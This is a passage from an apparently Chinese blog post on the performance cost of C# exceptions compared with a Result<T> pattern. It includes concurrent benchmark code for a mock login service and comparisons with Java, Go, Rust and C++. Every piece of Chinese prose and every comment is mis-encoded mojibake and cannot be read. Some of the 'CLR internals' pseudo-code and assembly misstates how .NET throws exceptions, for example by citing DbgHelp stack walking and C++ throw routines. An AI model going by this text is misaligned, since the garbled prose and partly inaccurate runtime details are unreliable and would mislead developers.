æµ‹è¯•ç»“æœï¼šè§¦ç›®æƒŠå¿ƒ</h2>\n<p>å…ˆä¸Šå›¾ï¼Œçœ‹æµ‹è¯•ç»“æœ(<strong>åŸºäºRELEASEæ¨¡å¼ç¼–è¯‘</strong>)ï¼š</p>\n<p><img alt=\"image\" class=\"lazyload\" /></p>\n<h2 id=\"33-å¹¶å‘åœºæ™¯ä¸‹æ€§èƒ½å·®è·ä¾æ—§ä¸å¿ç›´è§†\">3.3 å¹¶å‘åœºæ™¯ä¸‹ï¼šæ€§èƒ½å·®è·ä¾æ—§ä¸å¿ç›´è§†</h2>\n<p>å¹¶å‘æµ‹è¯•æ ¸å¿ƒä»£ç ï¼š</p>\n<pre><code class=\"language-csharp\">/// &lt;summary&gt;\n/// // å¹¶å‘æµ‹è¯•ç»“æœç±»\n/// &lt;/summary&gt;\npublic class ConcurrentTestResult\n{\n    public int Concurrency { get; set; }\n    public long ExceptionTime { get; set; }\n    public long ResultTime { get; set; }\n    public double ExceptionOpsPerSecond { get; set; }\n    public double ResultOpsPerSecond { get; set; }\n}\n\n\n/// &lt;summary&gt;\n/// å¹¶å‘æµ‹è¯•å™¨\n/// &lt;/summary&gt;\npublic class ConcurrentPerformanceTester\n{\n    private readonly LoginService _service = new();\n    private readonly Random _random = new(42);\n\n    private readonly double _errorRate = 0.3;\n\n\n    public async Task RunConcurrentTests(int totalIterations = 1000000)\n    {\n        Console.WriteLine(\"\\nå¹¶å‘æ€§èƒ½æµ‹è¯• - æ€»è¿­ä»£æ¬¡æ•°: {0:N0} - é”™è¯¯ç‡ï¼š{1:P0}\", totalIterations, _errorRate);\n        Console.WriteLine(\"=\".PadRight(60, '='));\n\n        var concurrencyLevels = new[] { 4, 8, 16, 32, 64, 128, 256 };\n\n        foreach (var concurrency in concurrencyLevels)\n        {\n            Console.WriteLine($\"\\nå¹¶å‘æ•°: {concurrency}\");\n\n            // é¢„çƒ­\n            await Warmup(concurrency);\n\n            // å¼‚å¸¸æ–¹å¼å¹¶å‘æµ‹è¯•ï¼ˆ30%é”™è¯¯ç‡æ¨¡æ‹ŸçœŸå®åœºæ™¯ï¼‰\n            var exceptionTime = await RunConcurrentExceptionTest(\n                concurrency,\n                totalIterations,\n                errorRate: _errorRate\n            );\n\n            // Resultæ–¹å¼å¹¶å‘æµ‹è¯•\n            var resultTime = await RunConcurrentResultTest(\n                concurrency,\n                totalIterations,\n                errorRate: _errorRate\n            );\n\n            var exceptionOps = totalIterations / (exceptionTime / 1000.0);\n            var resultOps = totalIterations / (resultTime / 1000.0);\n            var speedup = exceptionTime / (double)resultTime;\n\n            Console.WriteLine($\"  å¼‚å¸¸: {exceptionTime,5}ms ({exceptionOps,8:N0} ops/s)\");\n            Console.WriteLine($\"  Result: {resultTime,5}ms ({resultOps,8:N0} ops/s)\");\n            Console.WriteLine($\"  Resultå¿« {speedup:F1}x\");\n        }\n    }\n\n    /// &lt;summary&gt;\n    /// å¹¶å‘å¼‚å¸¸æµ‹è¯•\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"concurrency\"&gt;&lt;/param&gt;\n    /// &lt;param name=\"totalIterations\"&gt;&lt;/param&gt;\n    /// &lt;param name=\"errorRate\"&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    private async Task&lt;long&gt; RunConcurrentExceptionTest(\n        int concurrency,\n        int totalIterations,\n        double errorRate)\n    {\n        var iterationsPerTask = totalIterations / concurrency;\n        var tasks = new Task[concurrency];\n\n        var sw = Stopwatch.StartNew();\n\n        for (int i = 0; i &lt; concurrency; i++)\n        {\n            // æ¯ä¸ªä»»åŠ¡ä½¿ç”¨è‡ªå·±çš„éšæœºå®ä¾‹ï¼Œé¿å…ç«äº‰\n            var taskRandom = new Random(_random.Next());\n            tasks[i] = Task.Run(() =&gt;\n            {\n                for (int j = 0; j &lt; iterationsPerTask; j++)\n                {\n                    // ä¸ºæ¯æ¬¡è¿­ä»£ç”Ÿæˆæµ‹è¯•æ•°æ®ï¼Œé¿å…ç´¢å¼•é—®é¢˜\n                    var (user, pwd) = GenerateTestDataForIteration(taskRandom, errorRate);\n                    try\n                    {\n                        _service.LoginWithException(user, pwd);\n                    }\n                    catch (BusinessException)\n                    {\n                        // é¢„æœŸå¼‚å¸¸\n                    }\n                }\n            });\n        }\n\n        await Task.WhenAll(tasks);\n        sw.Stop();\n\n        return sw.ElapsedMilliseconds;\n    }\n\n    /// &lt;summary&gt;\n    /// å¹¶å‘Resultæµ‹è¯•\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"concurrency\"&gt;&lt;/param&gt;\n    /// &lt;param name=\"totalIterations\"&gt;&lt;/param&gt;\n    /// &lt;param name=\"errorRate\"&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    private async Task&lt;long&gt; RunConcurrentResultTest(\n        int concurrency,\n        int totalIterations,\n        double errorRate)\n    {\n        var iterationsPerTask = totalIterations / concurrency;\n        var tasks = new Task[concurrency];\n\n        var sw = Stopwatch.StartNew();\n\n        for (int i = 0; i &lt; concurrency; i++)\n        {\n            var taskRandom = new Random(_random.Next());\n            tasks[i] = Task.Run(() =&gt;\n            {\n                for (int j = 0; j &lt; iterationsPerTask; j++)\n                {\n                    var (user, pwd) = GenerateTestDataForIteration(taskRandom, errorRate);\n                    var result = _service.LoginWithResult(user, pwd);\n                    // ä¸éœ€è¦é¢å¤–å¤„ç†ï¼ŒResultå·²ç»åŒ…å«äº†æˆåŠŸ/å¤±è´¥çŠ¶æ€\n                }\n            });\n        }\n\n        await Task.WhenAll(tasks);\n        sw.Stop();\n\n        return sw.ElapsedMilliseconds;\n    }\n\n    /// &lt;summary&gt;\n    /// ä¸ºå•æ¬¡è¿­ä»£ç”Ÿæˆæµ‹è¯•æ•°æ®\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"random\"&gt;&lt;/param&gt;\n    /// &lt;param name=\"errorRate\"&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    private static (string user, string pwd) GenerateTestDataForIteration(Random random, double errorRate)\n    {\n        if (random.NextDouble() &gt; errorRate)\n        {\n            // æˆåŠŸæ¡ˆä¾‹\n            return (\"valid_user\", \"correct_password\");\n        }\n        else\n        {\n            // å¤±è´¥æ¡ˆä¾‹ - éšæœºé€‰æ‹©å¤±è´¥ç±»å‹\n            if (random.Next(2) == 0)\n                return (\"invalid_user\", \"any_password\");  // ç”¨æˆ·ä¸å­˜åœ¨\n            else\n                return (\"valid_user\", \"wrong_password\");   // å¯†ç é”™è¯¯\n        }\n    }\n\n    /// &lt;summary&gt;\n    /// é¢„çƒ­\n    /// &lt;/summary&gt;\n    /// &lt;param name=\"concurrency\"&gt;&lt;/param&gt;\n    /// &lt;param name=\"errorRate\"&gt;&lt;/param&gt;\n    /// &lt;returns&gt;&lt;/returns&gt;\n    private async Task Warmup(int concurrency, double errorRate = 0.3)\n    {\n        var warmupTasks = new Task[Math.Min(concurrency, 4)];\n\n        for (int i = 0; i &lt; warmupTasks.Length; i++)\n        {\n            warmupTasks[i] = Task.Run(() =&gt;\n            {\n                var taskRandom = new Random(_random.Next());\n                for (int j = 0; j &lt; 100; j++)\n                {\n                    var (user, pwd) = GenerateTestDataForIteration(taskRandom, errorRate);\n                    try\n                    {\n                        _service.LoginWithException(user, pwd);\n                    }\n                    catch { }\n\n                    _service.LoginWithResult(user, pwd);\n                }\n            });\n        }\n\n        await Task.WhenAll(warmupTasks);\n        GC.Collect();\n        GC.WaitForPendingFinalizers();\n        GC.Collect();\n    }\n}\n</code></pre>\n<p>å¹¶å‘æµ‹è¯•ç»“æœï¼š<br />\n<img alt=\"image\" class=\"lazyload\" /></p>\n<p>ä¸Šè¿°æµ‹è¯•å¯èƒ½å¹¶ä¸ä¸¥è°¨å’Œæƒå¨ï¼Œä½†æ˜¯æš´éœ²å‡ºæ¥çš„é—®é¢˜è¿˜æ˜¯éå¸¸æ˜æ˜¾çš„ï¼š</p>\n<ul>\n<li>åœ¨100%å¤±è´¥åœºæ™¯ä¸‹ï¼ŒResultæ¯”Exceptionå¿«äº†å·®ä¸å¤š200å€</li>\n<li>æ¥è¿‘å®é™…ä¸šåŠ¡åœºæ™¯çš„30%é”™è¯¯ç‡æƒ…å†µä¸‹ï¼ŒResultæ¯”Exceptionä¹Ÿå¿«äº†160å¤šå€</li>\n<li>å¹¶å‘åœºæ™¯ä¸‹ï¼Œæ€§èƒ½å·®è·ä¹Ÿæœ‰æ¥è¿‘ç™¾å€</li>\n</ul>\n<h1 id=\"å››ä¸ºä»€ä¹ˆå¼‚å¸¸åœ¨ä¸šåŠ¡åœºæ™¯ä¸‹å¦‚æ­¤æ˜‚è´µ\">å››ã€ä¸ºä»€ä¹ˆå¼‚å¸¸åœ¨ä¸šåŠ¡åœºæ™¯ä¸‹å¦‚æ­¤\"æ˜‚è´µ\"ï¼Ÿ</h1>\n<h2 id=\"41-clrå¼‚å¸¸æœºåˆ¶çš„åº•å±‚åŸç†\">4.1 CLRå¼‚å¸¸æœºåˆ¶çš„åº•å±‚åŸç†</h2>\n<h3 id=\"411-å¼‚å¸¸å¯¹è±¡çš„æ„é€ è¿‡ç¨‹\">4.1.1 å¼‚å¸¸å¯¹è±¡çš„æ„é€ è¿‡ç¨‹</h3>\n<p>å½“æˆ‘ä»¬åœ¨C#ä¸­æŠ›å‡ºå¼‚å¸¸æ—¶ï¼Œçœ‹ä¼¼ç®€å•çš„ä¸€è¡Œä»£ç ï¼ŒèƒŒåå´å‘ç”Ÿäº†å¤§é‡å¤æ‚çš„æ“ä½œï¼š</p>\n<pre><code class=\"language-csharp\">throw new BusinessException(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n</code></pre>\n<p>è¿™ä¸ªæ“ä½œçš„å®é™…æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>\n<pre><code class=\"language-csharp\">// ä¼ªä»£ç å±•ç¤ºå¼‚å¸¸æ„é€ çš„å®é™…å¼€é”€\npublic static Exception CreateException(string message)\n{\n    // 1. å †åˆ†é…ï¼šå¼‚å¸¸å¯¹è±¡æœ¬èº«ï¼ˆè‡³å°‘40-64å­—èŠ‚ï¼‰\n    var exception = RuntimeHelpers.AllocateException(typeof(BusinessException));\n    \n    // 2. å­—æ®µåˆå§‹åŒ–ï¼ˆè°ƒç”¨æ„é€ å‡½æ•°é“¾ï¼‰\n    exception._message = message;  // å­—ç¬¦ä¸²åˆ†é…\n    exception._stackTrace = null;\n    exception._innerException = null;\n    exception._helpURL = null;\n    exception._source = null;\n    \n    // 3. æ•è·è°ƒç”¨å †æ ˆï¼ˆæœ€æ˜‚è´µçš„éƒ¨åˆ†ï¼ï¼‰\n    exception.CaptureStackTrace();\n    \n    return exception;\n}\n\nprivate void CaptureStackTrace()\n{\n    // 4. è·å–å½“å‰çº¿ç¨‹çš„è°ƒç”¨å †æ ˆ\n    var frames = new StackFrame[64];  // åˆ†é…æ•°ç»„\n    var frameCount = StackTraceHelper.CaptureStackTrace(\n        frames, 0,  // èµ·å§‹ä½ç½®\n        false,      // æ˜¯å¦éœ€è¦æ–‡ä»¶ä¿¡æ¯\n        null);      // å¼‚å¸¸å¯¹è±¡æœ¬èº«\n    \n    // 5. æ ¼å¼åŒ–æˆå­—ç¬¦ä¸²ï¼ˆå¯èƒ½æ¶‰åŠå¤§é‡å­—ç¬¦ä¸²æ“ä½œï¼‰\n    this._stackTrace = FormatStackTrace(frames, frameCount);\n}\n</code></pre>\n<h3 id=\"412-å †æ ˆè·Ÿè¸ªçš„çœŸå®ä»£ä»·\">4.1.2 å †æ ˆè·Ÿè¸ªçš„çœŸå®ä»£ä»·</h3>\n<p>è®©æˆ‘ä»¬æ·±å…¥çœ‹çœ‹<code>CaptureStackTrace</code>åˆ°åº•åšäº†ä»€ä¹ˆï¼š</p>\n<pre><code class=\"language-csharp\">// Windowsä¸Šçš„å®é™…å®ç°ï¼ˆç®€åŒ–ï¼‰\ninternal static unsafe int CaptureStackTrace(\n    StackFrame[] frames, \n    int startIndex,\n    bool needFileInfo,\n    Exception exception)\n{\n    // 1. è°ƒç”¨ç³»ç»ŸAPIè·å–å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡\n    CONTEXT context;\n    RtlCaptureContext(&amp;context);\n    \n    // 2. éå†è°ƒç”¨å †æ ˆï¼ˆæ€§èƒ½æ€æ‰‹ï¼ï¼‰\n    STACKFRAME64 stackFrame = new STACKFRAME64();\n    while (StackWalk64(\n        IMAGE_FILE_MACHINE_AMD64,\n        GetCurrentProcess(),\n        GetCurrentThread(),\n        &amp;stackFrame,\n        &amp;context,\n        null,\n        SymFunctionTableAccess64,\n        SymGetModuleBase64,\n        null))\n    {\n        // 3. è§£ææ¯ä¸ªæ ˆå¸§çš„ä¿¡æ¯\n        frames[frameCount++] = new StackFrame(\n            stackFrame.AddrPC.Offset,\n            needFileInfo ? GetSourceInfo(stackFrame) : null);\n        \n        if (frameCount &gt;= frames.Length) break;\n    }\n    \n    return frameCount;\n}\n</code></pre>\n<p>å…³é”®ç‚¹ï¼š</p>\n<ul>\n<li>æ¯ä¸ªthrowæ“ä½œéƒ½è¦éå†æ•´ä¸ªè°ƒç”¨å †æ ˆ</li>\n<li>å †æ ˆéå†æ¶‰åŠå¤šä¸ªç³»ç»Ÿè°ƒç”¨å’Œå†…å­˜è®¿é—®</li>\n<li>éœ€è¦å°†å†…å­˜åœ°å€è§£æä¸ºæ–¹æ³•åã€æ–‡ä»¶åã€è¡Œå·ç­‰</li>\n<li>åœ¨Releaseæ¨¡å¼ä¸‹ï¼ŒJITä¼˜åŒ–å¯èƒ½ä¼šå½±å“å †æ ˆä¿¡æ¯</li>\n</ul>\n<h3 id=\"413-jitå’Œaotç¼–è¯‘å¯¹å¼‚å¸¸çš„å½±å“\">4.1.3 JITå’ŒAOTç¼–è¯‘å¯¹å¼‚å¸¸çš„å½±å“</h3>\n<pre><code class=\"language-csharp\">// è€ƒè™‘ä»¥ä¸‹ä»£ç \npublic int Process(int value)\n{\n    try\n    {\n        return ProcessValue(value);  // å¯èƒ½æŠ›å‡ºå¼‚å¸¸\n    }\n    catch (Exception)\n    {\n        return -1;\n    }\n}\n\n// JITç¼–è¯‘å™¨éœ€è¦ç”Ÿæˆï¼š\n// 1. æ­£å¸¸æ‰§è¡Œè·¯å¾„çš„ä»£ç \n// 2. å¼‚å¸¸å¤„ç†è¡¨ï¼ˆEHè¡¨ï¼‰\n// 3. å †æ ˆå±•å¼€ä»£ç \n// 4. finallyå—æ‰§è¡Œé€»è¾‘ï¼ˆå¦‚æœæœ‰ï¼‰\n</code></pre>\n<p>EHè¡¨çš„ç»“æ„ï¼š</p>\n<pre><code>Method Exception Handling Table:\nStart   Length  Handler Type    Class           Filter\n0x0000  0x0020  0x0030  CLAUSE  Exception       null\n</code></pre>\n<p>æ¯ä¸ªtry-catchå—éƒ½ä¼šåœ¨æ–¹æ³•çš„å…ƒæ•°æ®ä¸­æ·»åŠ EHè¡¨æ¡ç›®ï¼Œå¢åŠ æ–¹æ³•å¤§å°å’ŒåŠ è½½æ—¶é—´ã€‚</p>\n<h2 id=\"42-å¼‚å¸¸å¤„ç†çš„å†…å­˜åˆ†é…ç»†èŠ‚\">4.2 å¼‚å¸¸å¤„ç†çš„å†…å­˜åˆ†é…ç»†èŠ‚</h2>\n<h3 id=\"421-å¼‚å¸¸å¯¹è±¡çš„å†…å­˜å¸ƒå±€\">4.2.1 å¼‚å¸¸å¯¹è±¡çš„å†…å­˜å¸ƒå±€</h3>\n<pre><code class=\"language-csharp\">// Exceptionç±»çš„ç®€åŒ–å†…å­˜å¸ƒå±€\nclass Exception\n{\n    // å¯¹è±¡å¤´ï¼ˆ8-16å­—èŠ‚ï¼‰\n    MethodTable* _methodTable;  // 8å­—èŠ‚\n    // åŒæ­¥å—ç´¢å¼•ï¼ˆå¯é€‰ï¼‰\n    \n    // å®ä¾‹å­—æ®µ\n    string _message;           // 8å­—èŠ‚ï¼ˆå¼•ç”¨ï¼‰\n    IDictionary _data;         // 8å­—èŠ‚ï¼ˆé€šå¸¸ä¸ºnullï¼‰\n    Exception _innerException; // 8å­—èŠ‚\n    string _helpURL;          // 8å­—èŠ‚\n    string _source;           // 8å­—èŠ‚\n    string _stackTrace;       // 8å­—èŠ‚ï¼ˆå­—ç¬¦ä¸²ï¼Œå®é™…åˆ†é…æ›´å¤§ï¼‰\n    object _stackTraceString; // 8å­—èŠ‚ï¼ˆå¯èƒ½ä¸åŒæ ¼å¼ï¼‰\n    object _remoteStackTrace; // 8å­—èŠ‚\n    int _remoteStackIndex;    // 4å­—èŠ‚\n    int _HResult;             // 4å­—èŠ‚\n    \n    // æ€»å…±ï¼šè‡³å°‘80å­—èŠ‚ï¼ˆ64ä½ç³»ç»Ÿï¼‰\n    // åŠ ä¸Šå­—ç¬¦ä¸²å†…å®¹ï¼šå¯èƒ½æ•°ç™¾åˆ°æ•°åƒå­—èŠ‚\n}\n</code></pre>\n<h3 id=\"422-gcçš„å½±å“\">4.2.2 GCçš„å½±å“</h3>\n<pre><code class=\"language-csharp\">// é«˜é¢‘æŠ›å‡ºå¼‚å¸¸ä¼šæ˜¾è‘—å½±å“GC\npublic void TestExceptionGC()\n{\n    var list = new List&lt;Exception&gt;();\n    \n    for (int i = 0; i &lt; 10000; i++)\n    {\n        try\n        {\n            throw new Exception($\"Error {i}\");\n        }\n        catch (Exception ex)\n        {\n            list.Add(ex);  // å¤§é‡å¯¹è±¡è¿›å…¥ç¬¬0ä»£å †\n        }\n    }\n}\n\n</code></pre>\n<p>ä¸Šè¿°ä»£ç ä¼šå¯¼è‡´:</p>\n<ul>\n<li>è§¦å‘é¢‘ç¹çš„Gen0 GC</li>\n<li>å¦‚æœexè¢«é•¿æ—¶é—´å¼•ç”¨ï¼Œå¯èƒ½è¿›å…¥Gen1/Gen2</li>\n<li>å¢åŠ GCæš‚åœæ—¶é—´</li>\n<li>é™ä½ç¼“å­˜å±€éƒ¨æ€§</li>\n</ul>\n<h2 id=\"43-cpuçº§åˆ«çš„æ€§èƒ½å½±å“\">4.3 CPUçº§åˆ«çš„æ€§èƒ½å½±å“</h2>\n<h3 id=\"431-ç°ä»£cpuçš„å¼‚å¸¸å¤„ç†å¼€é”€\">4.3.1 ç°ä»£CPUçš„å¼‚å¸¸å¤„ç†å¼€é”€</h3>\n<pre><code class=\"language-assembly\">; x64æ±‡ç¼–å±‚é¢çš„å¼‚å¸¸å¤„ç†\n; æ­£å¸¸è·¯å¾„ï¼š\nprocess_value:\n    mov eax, [rcx]      ; åŠ è½½å€¼\n    add eax, 100        ; è®¡ç®—\n    ret                 ; è¿”å›\n    \n; å¼‚å¸¸è·¯å¾„ï¼š\nthrow_exception:\n    ; 1. ä¿å­˜æ‰€æœ‰å¯„å­˜å™¨åˆ°å †æ ˆ\n    push rbx\n    push rbp\n    push r12\n    push r13\n    push r14\n    push r15\n    sub rsp, 28h        ; åˆ†é…å †æ ˆç©ºé—´\n    \n    ; 2. è°ƒç”¨å¼‚å¸¸æ„é€ å‡½æ•°\n    call Exception..ctor\n    \n    ; 3. è®¾ç½®SEHï¼ˆç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼‰\n    mov [rsp+20h], rcx  ; ä¿å­˜å¼‚å¸¸å¯¹è±¡\n    call __CxxThrowException@8\n    \n    ; 4. æ¸…ç†å †æ ˆ\n    add rsp, 28h\n    pop r15\n    pop r14\n    pop r13\n    pop r12\n    pop rbp\n    pop rbx\n</code></pre>\n<p>CPUå±‚é¢çš„é—®é¢˜:</p>\n<ul>\n<li><strong>åˆ†æ”¯é¢„æµ‹å¤±è´¥</strong>ï¼šå¼‚å¸¸è·¯å¾„å¾ˆå°‘æ‰§è¡Œï¼ŒCPUåˆ†æ”¯é¢„æµ‹å™¨éš¾ä»¥ä¼˜åŒ–</li>\n<li><strong>ç¼“å­˜å¤±æ•ˆ</strong>ï¼šå¼‚å¸¸å¤„ç†ä»£ç é€šå¸¸ä¸åœ¨æŒ‡ä»¤ç¼“å­˜ä¸­</li>\n<li><strong>æµæ°´çº¿åœé¡¿</strong>ï¼šå¼‚å¸¸å¤„ç†éœ€è¦ä¿å­˜/æ¢å¤å¤§é‡å¯„å­˜å™¨çŠ¶æ€</li>\n<li><strong>å†…å­˜è®¿é—®æ¨¡å¼å·®</strong>ï¼šEHè¡¨æŸ¥æ‰¾å¯¼è‡´éšæœºå†…å­˜è®¿é—®</li>\n</ul>\n<h3 id=\"432-å¯¹æ¯”æ­£å¸¸è¿”å›å’Œå¼‚å¸¸è¿”å›\">4.3.2 å¯¹æ¯”æ­£å¸¸è¿”å›å’Œå¼‚å¸¸è¿”å›</h3>\n<pre><code class=\"language-csharp\">// Result&lt;T&gt;çš„æ­£å¸¸è¿”å›è·¯å¾„\nreturn Result&lt;User&gt;.Fail(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n// æ±‡ç¼–ï¼š\n; 1. æ„é€ Resultå¯¹è±¡ï¼ˆå¯èƒ½åœ¨æ ˆä¸Šï¼‰\n; 2. è®¾ç½®Success=false\n; 3. è®¾ç½®Errorå­—æ®µ\n; 4. è¿”å›ï¼ˆæ™®é€šretæŒ‡ä»¤ï¼‰\n\n// å¼‚å¸¸è¿”å›è·¯å¾„\nthrow new BusinessException(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n// æ±‡ç¼–ï¼š\n; 1. å †åˆ†é…å¼‚å¸¸å¯¹è±¡\n; 2. æ•è·å †æ ˆè·Ÿè¸ª\n; 3. è®¾ç½®SEHå¸§\n; 4. è°ƒç”¨kernel32!RaiseException\n; 5. å †æ ˆå±•å¼€\n; 6. æŸ¥æ‰¾catchå—\n; 7. æ‰§è¡Œcatchå—ä»£ç \n</code></pre>\n<h2 id=\"44-å¯¹æ¯”å…¶ä»–ç¼–ç¨‹è¯­è¨€\">4.4 å¯¹æ¯”å…¶ä»–ç¼–ç¨‹è¯­è¨€</h2>\n<h3 id=\"441-javaçš„å¼‚å¸¸æœºåˆ¶\">4.4.1 Javaçš„å¼‚å¸¸æœºåˆ¶</h3>\n<pre><code class=\"language-java\">// Javaçš„å¼‚å¸¸ä½¿ç”¨çœ‹èµ·æ¥å’ŒC#ç›¸ä¼¼\npublic User login(String username, String password) \n    throws UserNotFoundException, InvalidPasswordException\n{\n    User user = findUser(username);\n    if (user == null) {\n        throw new UserNotFoundException(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n    }\n    if (!verifyPassword(user, password)) {\n        throw new InvalidPasswordException(\"å¯†ç é”™è¯¯\");\n    }\n    return user;\n}\n</code></pre>\n<p>Javaå¼‚å¸¸çš„ç‰¹ç‚¹ï¼š<br />\n1.æ£€æŸ¥å‹å¼‚å¸¸ï¼ˆChecked Exceptionï¼‰ï¼šå¼ºåˆ¶å¤„ç†æˆ–å£°æ˜<br />\n2.æ€§èƒ½å¼€é”€ä¸C#ç±»ä¼¼ï¼šåŒæ ·éœ€è¦æ•è·å †æ ˆè·Ÿè¸ª<br />\n3.JVMçš„ä¼˜åŒ–ï¼šHotSpot JVMæœ‰æ›´æˆç†Ÿçš„å¼‚å¸¸ä¼˜åŒ–:</p>\n<ul>\n<li>å†…è”ç¼“å­˜ï¼ˆInline Cacheï¼‰</li>\n<li>æ ˆä¸Šæ›¿æ¢ï¼ˆOn-Stack Replacementï¼‰</li>\n<li>ä½†ä¸šåŠ¡å¼‚å¸¸ä»ç„¶æ˜‚è´µ</li>\n</ul>\n<p><strong>é‡è¦åŒºåˆ«ï¼š</strong></p>\n<pre><code class=\"language-java\">// Java 14+å¼•å…¥äº†Recordsï¼Œä½†å¼‚å¸¸å¼€é”€ä¾æ—§\npublic record Result&lt;T&gt;(T value, String error) {\n    public boolean isSuccess() { return error == null; }\n}\n\n// Javaç¤¾åŒºä¹Ÿåœ¨è½¬å‘Resultæ¨¡å¼ï¼Œç‰¹åˆ«æ˜¯å“åº”å¼ç¼–ç¨‹\npublic Mono&lt;User&gt; login(String username, String password) {\n    return Mono.fromCallable(() -&gt; findUser(username))\n        .switchIfEmpty(Mono.error(new UserNotFoundException()))\n        .filter(user -&gt; verifyPassword(user, password))\n        .switchIfEmpty(Mono.error(new InvalidPasswordException()));\n}\n</code></pre>\n<h3 id=\"442-goçš„é”™è¯¯å¤„ç†å“²å­¦\">4.4.2 Goçš„é”™è¯¯å¤„ç†å“²å­¦</h3>\n<pre><code class=\"language-go\">// Goçš„é”™è¯¯å¤„ç†ï¼šæ˜¾å¼è¿”å›é”™è¯¯\nfunc Login(username, password string) (*User, error) {\n    user, err := findUser(username)\n    if err != nil {\n        return nil, fmt.Errorf(\"æŸ¥æ‰¾ç”¨æˆ·å¤±è´¥: %w\", err)\n    }\n    \n    if !verifyPassword(user, password) {\n        return nil, errors.New(\"å¯†ç é”™è¯¯\")\n    }\n    \n    return user, nil\n}\n\n// è°ƒç”¨æ–¹å¿…é¡»æ˜¾å¼å¤„ç†é”™è¯¯\nuser, err := Login(\"test\", \"123\")\nif err != nil {\n    // å¤„ç†é”™è¯¯\n    switch {\n    case strings.Contains(err.Error(), \"å¯†ç é”™è¯¯\"):\n        // ç‰¹å®šå¤„ç†\n    default:\n        // é€šç”¨å¤„ç†\n    }\n}\n</code></pre>\n<p>Goçš„è®¾è®¡é€‰æ‹©ï¼š</p>\n<ul>\n<li><strong>æ²¡æœ‰å¼‚å¸¸æœºåˆ¶</strong>ï¼šåªæœ‰é”™è¯¯è¿”å›å€¼</li>\n<li><strong>é”™è¯¯æ˜¯å€¼ï¼ˆerrors are valuesï¼‰</strong>ï¼šå¯ä»¥åƒæ™®é€šå€¼ä¸€æ ·ä¼ é€’</li>\n<li><strong>å¼ºåˆ¶æ˜¾å¼å¤„ç†</strong>ï¼šæ— æ³•å¿½ç•¥é”™è¯¯ï¼ˆé™¤éä½¿ç”¨_ï¼‰</li>\n<li><strong>é›¶æˆæœ¬æŠ½è±¡</strong>ï¼šé”™è¯¯å¤„ç†å‡ ä¹æ²¡æœ‰è¿è¡Œæ—¶å¼€é”€</li>\n</ul>\n<p>Goçš„é”™è¯¯æ€§èƒ½ä¼˜åŠ¿:</p>\n<pre><code class=\"language-go\">// Goçš„errors.Newå®é™…ä¸Šå¾ˆç®€å•\nfunc New(text string) error {\n    return &amp;errorString{text}\n}\n\ntype errorString struct {\n    s string\n}\n\nfunc (e *errorString) Error() string {\n    return e.s\n}\n\n// æ²¡æœ‰å †æ ˆè·Ÿè¸ªï¼Œæ²¡æœ‰å¤æ‚æ„é€ \n// åªæ˜¯ä¸€ä¸ªåŒ…å«å­—ç¬¦ä¸²çš„ç»“æ„ä½“\n</code></pre>\n<h3 id=\"443-rustçš„resultç±»å‹\">4.4.3 Rustçš„Resultç±»å‹</h3>\n<pre><code class=\"language-rust\">// Rustçš„é”™è¯¯å¤„ç†ï¼šåŸºäºæšä¸¾çš„Result\nfn login(username: &amp;str, password: &amp;str) -&gt; Result&lt;User, LoginError&gt; {\n    let user = find_user(username)?;  // ?æ“ä½œç¬¦è‡ªåŠ¨ä¼ æ’­é”™è¯¯\n    \n    if !verify_password(&amp;user, password) {\n        return Err(LoginError::InvalidPassword);\n    }\n    \n    Ok(user)\n}\n\n// é”™è¯¯ç±»å‹å®šä¹‰\n#[derive(Debug)]\nenum LoginError {\n    UserNotFound,\n    InvalidPassword,\n    DatabaseError(DbError),\n}\n\n// ä½¿ç”¨matchå¤„ç†\nmatch login(\"test\", \"123\") {\n    Ok(user) =&gt; println!(\"æ¬¢è¿ {}\", user.name),\n    Err(LoginError::UserNotFound) =&gt; println!(\"ç”¨æˆ·ä¸å­˜åœ¨\"),\n    Err(LoginError::InvalidPassword) =&gt; println!(\"å¯†ç é”™è¯¯\"),\n    Err(e) =&gt; println!(\"å…¶ä»–é”™è¯¯: {:?}\", e),\n}\n</code></pre>\n<p>Rustçš„è®¾è®¡ç‰¹ç‚¹:</p>\n<ul>\n<li>é›¶æˆæœ¬æŠ½è±¡ï¼šResultåœ¨è¿è¡Œæ—¶é€šå¸¸æ˜¯æ™®é€šæšä¸¾</li>\n<li>æ¨¡å¼åŒ¹é…ï¼šç¼–è¯‘å™¨ç¡®ä¿æ‰€æœ‰æƒ…å†µéƒ½è¢«å¤„ç†</li>\n<li>é”™è¯¯ä¼ æ’­è¿ç®—ç¬¦ï¼ˆ?ï¼‰ï¼šç®€åŒ–é”™è¯¯ä¼ æ’­</li>\n<li>ä¸°å¯Œçš„é”™è¯¯åº“ï¼šanyhowã€thiserrorç­‰</li>\n</ul>\n<p>Rustçš„æ€§èƒ½ä¼˜åŠ¿ï¼š</p>\n<pre><code>ç¼–è¯‘åçš„Resulté€šå¸¸ä¼˜åŒ–ä¸ºï¼š\n1.æˆåŠŸï¼šå­˜å‚¨User\n2.å¤±è´¥ï¼šå­˜å‚¨é”™è¯¯ç ï¼ˆé€šå¸¸æ˜¯æ•´æ•°ï¼‰\n3.æ²¡æœ‰å †åˆ†é…ï¼Œæ²¡æœ‰è™šå‡½æ•°è°ƒç”¨\n</code></pre>\n<h3 id=\"444-cçš„é”™è¯¯å¤„ç†\">4.4.4 C++çš„é”™è¯¯å¤„ç†</h3>\n<pre><code class=\"language-cpp\">// C++çš„å¤šç§é”™è¯¯å¤„ç†æ–¹å¼\n\n// 1. å¼‚å¸¸ï¼ˆç±»ä¼¼C#/Javaï¼‰\nUser login(const std::string&amp; username, const std::string&amp; password) {\n    auto user = find_user(username);\n    if (!user) {\n        throw UserNotFoundException(\"ç”¨æˆ·ä¸å­˜åœ¨\");\n    }\n    if (!verify_password(*user, password)) {\n        throw InvalidPasswordException(\"å¯†ç é”™è¯¯\");\n    }\n    return 